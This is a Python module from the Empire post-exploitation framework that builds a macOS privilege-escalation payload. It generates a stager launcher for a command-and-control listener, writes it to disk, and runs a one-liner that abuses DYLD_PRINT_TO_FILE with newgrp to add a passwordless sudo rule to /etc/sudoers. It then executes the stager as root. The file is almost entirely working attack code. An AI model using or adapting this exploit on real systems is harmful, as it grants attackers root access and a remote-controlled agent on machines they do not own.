import logging
from typing import Dict

from empire.server.core.module_models import EmpireModule

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        listenername = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]

        launcher = main_menu.stagers.generate_launcher(
            listenername,
            language="python",
            userAgent=user_agent,
            safeChecks=safe_checks,
        )
        if launcher == "":
            log.error("Error in launcher generation")
        launcher = launcher.replace('"', '\\"')
        fullPath = params["WriteablePath"] + params["FileName"]
        fileName = params["FileName"]
        script = """
import os
print("Writing Stager to {filename}...")
file = open("{fullpath}","w")
file.write("{filecontents}")
file.close()
print("Attempting to execute stager as root...")
try:
	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullpath} &")
	print("Successfully ran command, you should be getting an elevated stager")
except:
	print("[!] Could not execute payload!")

	""".format(
            fullpath=fullPath, filecontents=launcher, filename=fileName
        )

        return script
